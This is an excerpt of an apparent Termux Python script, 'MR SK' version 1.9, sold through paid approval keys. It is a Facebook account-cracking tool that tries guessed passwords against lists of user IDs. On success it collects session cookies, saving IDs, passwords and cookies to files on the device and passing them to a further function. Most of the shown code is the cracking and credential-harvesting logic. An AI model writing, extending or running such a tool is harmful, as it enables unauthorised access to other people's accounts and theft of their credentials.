...
try:
	prox= requests.get('https://github.com/skmahmud999/Sk/blob/main/sk-approve.txt').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/skmahmud999/Sk/blob/main/sk-approve.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://github.com/skmahmud999/Sk/blob/main/sk-approve.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO MR SK TERMUX WORLD          ')
...
totaldmp = 0
filter = []
os.system("xdg-open https://chat.whatsapp.com/ESH9o4yVJut9shoqgmtJUW")
sys.stdout.write('\x1b]2; Mr:SK\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
__________________________________________________
 ...
 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31ALL METHOD WORKING\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            MR:SK
\033[1;92m Facebook:            MR.SK
\033[1;92m Github  :             SKMAHMUD999
\033[1;92m Version :            1.9
──────────────────────────────────────────────────""")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        exit()
os.system("xd-open https://chat.whatsapp.com/ESH9o4yVJut9shoqgmtJUW")
def menu():   
    os.system('clear')
    print(logo)
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/skmahmud77');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        NIX(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mMR-SK-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SKb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSK-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/SK/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SK/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [SK-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SK/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SK/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SK/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SK/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//SK/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SK/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [SK-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SK/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SK/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SK/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//SK/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SK-CP] '+uid+' | '+ps+'\x1b[1;97m')
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/skmahmud999/Sk/blob/main/sk-approve.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : MR.SK Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 5$ \033[1;92mApproval For 1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 4$ \033[1;92mApproval For 15 days')
            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 2$ \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;92m-----------------------------------------------------')
            ...
            tks = ("Hi SK Sir, I Need To Buy Your Tools Version 1.9 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
